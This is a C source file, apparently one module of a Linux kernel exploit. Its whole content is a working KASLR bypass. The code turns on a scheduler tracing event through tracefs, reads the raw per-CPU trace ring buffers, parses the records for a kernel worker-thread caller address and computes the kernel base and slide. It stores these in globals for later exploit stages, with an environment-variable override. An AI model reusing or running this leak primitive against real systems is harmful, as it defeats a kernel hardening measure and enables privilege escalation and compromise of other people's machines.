#include "common.h"

#define SLIDE_TRACEFS_ROOT "/sys/kernel/tracing"
#ifndef SLIDE_TRACEFS_EVENT_ID
#define SLIDE_TRACEFS_EVENT_ID 109
#endif

static int slide_tracefs_write(const char *path, const char *value) {
  int fd = open(path, O_WRONLY | O_CLOEXEC);
  if (fd < 0) {
    return 0;
  }
  size_t len = strlen(value);
  ssize_t wrote = write(fd, value, len);
  close(fd);
  return wrote == (ssize_t)len;
}

static int slide_tracefs_parse_page(
    const unsigned char *page, size_t page_len, uintptr_t *candidate_out) {
  if (page_len < 20) {
    return 0;
  }

  uint64_t commit = 0;
  memcpy(&commit, page + 8, sizeof(commit));
  size_t data_len = (size_t)(commit & 0xfffULL);
  size_t end = 16 + data_len;
  if (end > page_len) {
    end = page_len;
  }

  for (size_t pos = 16; pos + 4 <= end;) {
    uint32_t event_header = 0;
    memcpy(&event_header, page + pos, sizeof(event_header));
    uint32_t type_len = event_header & 0x1fU;
    if (type_len == 30) {
      pos += 8;
      continue;
    }
    if (type_len == 31) {
      pos += 12;
      continue;
    }
    if (type_len == 0 || type_len >= 29) {
      break;
    }

    size_t record_len = (size_t)type_len * 4;
    size_t record = pos + 4;
    if (record + record_len > end) {
      break;
    }
    uint16_t event_id = 0;
    memcpy(&event_id, page + record, sizeof(event_id));
    if (event_id == SLIDE_TRACEFS_EVENT_ID && record_len >= 24) {
      uint64_t caller = 0;
      memcpy(&caller, page + record + 16, sizeof(caller));
      uint64_t link_caller =
          KIMAGE_TEXT_BASE + SLIDE_TRACEFS_WORKER_CALLER_OFF;
      if (caller >= link_caller) {
        uint64_t candidate = caller - link_caller;
        if (candidate <= 0x1f0000ULL && (candidate & 0xffffULL) == 0) {
          pr_success("slide tracefs caller=%016llx candidate=%08llx\n",
                     (unsigned long long)caller,
                     (unsigned long long)candidate);
          *candidate_out = (uintptr_t)candidate;
          return 1;
        }
      }
    }
    pos = record + record_len;
  }
  return 0;
}

static int slide_tracefs_leak_kernel_base(void) {
  static const char tracing_on[] =
      SLIDE_TRACEFS_ROOT "/tracing_on";
  static const char trace[] =
      SLIDE_TRACEFS_ROOT "/trace";
  static const char event_enable[] =
      SLIDE_TRACEFS_ROOT "/events/sched/sched_blocked_reason/enable";

  /* Retry loop: the capture window is timing-sensitive; retry up to
   * SLIDE_MAX_ATTEMPTS times with a fresh 1-second observation window. */
#ifndef SLIDE_MAX_ATTEMPTS
#define SLIDE_MAX_ATTEMPTS 8
#endif
  int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);

  for (int attempt = 0; attempt < SLIDE_MAX_ATTEMPTS; attempt++) {
    /* Enable tracing and clear the ring buffer. */
    slide_tracefs_write(tracing_on, "0");
    slide_tracefs_write(event_enable, "1");
    /* Clear the trace buffer so stale data from prior attempts is gone. */
    int tfd = open(trace, O_WRONLY | O_TRUNC | O_CLOEXEC);
    if (tfd >= 0) close(tfd);
    slide_tracefs_write(tracing_on, "1");

    /* Sleep 1 second to let at least one worker_thread blocking event land. */
    sleep(1);
    slide_tracefs_write(tracing_on, "0");

    uintptr_t candidate = 0;
    int found = 0;

    for (int cpu = 0; cpu < cpu_count && !found; cpu++) {
      char path[128];
      snprintf(path, sizeof(path),
               SLIDE_TRACEFS_ROOT "/per_cpu/cpu%d/trace_pipe_raw", cpu);

      /* Fork a child to drain the pipe so we don't block the main process. */
      int pfd[2];
      if (pipe(pfd) < 0)
        continue;

      pid_t child = fork();
      if (child == 0) {
        close(pfd[0]);
        /* O_NONBLOCK: all data is already in the ring buffer (tracing is off).
         * The child drains what's there and exits immediately. */
        int rfd = open(path, O_RDONLY | O_NONBLOCK | O_CLOEXEC);
        if (rfd >= 0) {
          unsigned char buf[4096];
          ssize_t n;
          while ((n = read(rfd, buf, sizeof(buf))) > 0)
            write(pfd[1], buf, (size_t)n);
          close(rfd);
        }
        close(pfd[1]);
        _exit(0);
      }
      close(pfd[1]);

      /* Read all data from child with a short timeout (data is already
       * buffered; child exits quickly with O_NONBLOCK). */
      size_t bufsz = 524288;
      unsigned char *buf = malloc(bufsz);
      ssize_t total = 0;
      while ((size_t)total < bufsz) {
        fd_set rfds;
        struct timeval tv = { .tv_sec = 1, .tv_usec = 0 };
        FD_ZERO(&rfds);
        FD_SET(pfd[0], &rfds);
        if (select(pfd[0] + 1, &rfds, NULL, NULL, &tv) <= 0)
          break;
        ssize_t got = read(pfd[0], buf + total, bufsz - (size_t)total);
        if (got <= 0)
          break;
        total += got;
      }
      kill(child, SIGTERM);
      waitpid(child, NULL, 0);
      close(pfd[0]);

      /* Scan all pages in the buffer. */
      for (ssize_t off = 0; off < total && !found; ) {
        size_t remain = (size_t)(total - off);
        if (remain < 20) break;
        uint64_t commit = 0;
        memcpy(&commit, buf + off + 8, sizeof(commit));
        size_t data_len = (size_t)(commit & 0xfffULL);
        size_t page_end = (size_t)off + 16 + data_len;
        if (page_end > (size_t)total)
          page_end = (size_t)total;
        if (slide_tracefs_parse_page(buf + off, page_end - off, &candidate))
          found = 1;
        off = (ssize_t)((page_end + 15) & ~(size_t)15);
      }
      free(buf);
    }

    slide_tracefs_write(event_enable, "0");

    if (found) {
      slide_p0_offset = candidate;
      kaslr_base = KIMAGE_TEXT_BASE + candidate;
      kaslr_slide = candidate;
      kaslr_done = 1;
      pr_success("slide-kaslr-ok source=tracefs pid=%d base=%016llx "
                 "slide=%016llx p0_offset=%08zx attempt=%d\n",
                 getpid(), (unsigned long long)kaslr_base,
                 (unsigned long long)kaslr_slide, slide_p0_offset,
                 attempt + 1);
      return 1;
    }

    pr_error("slide tracefs worker caller not found (attempt %d/%d)\n",
             attempt + 1, SLIDE_MAX_ATTEMPTS);
  }

  return 0;
}

int slide_leak_kernel_base(void) {
  const char *forced_offset_arg = getenv("SLIDE_P0_OFFSET");
  if (forced_offset_arg && *forced_offset_arg) {
    char *end = NULL;
    errno = 0;
    unsigned long long value = strtoull(forced_offset_arg, &end, 0);
    if (errno || end == forced_offset_arg || *end || value > 0x1f0000ULL ||
        (value & 0xffffULL) != 0) {
      pr_error("slide invalid forced p0 offset=%s\n", forced_offset_arg);
      return 0;
    }
    slide_p0_offset = (uintptr_t)value;
    kaslr_base = KIMAGE_TEXT_BASE + slide_p0_offset;
    kaslr_slide = slide_p0_offset;
    kaslr_done = 1;
    pr_success("slide-kaslr-ok source=forced pid=%d base=%016llx "
               "slide=%016llx p0_offset=%08zx\n",
               getpid(), (unsigned long long)kaslr_base,
               (unsigned long long)kaslr_slide, slide_p0_offset);
    return 1;
  }
  return slide_tracefs_leak_kernel_base();
}
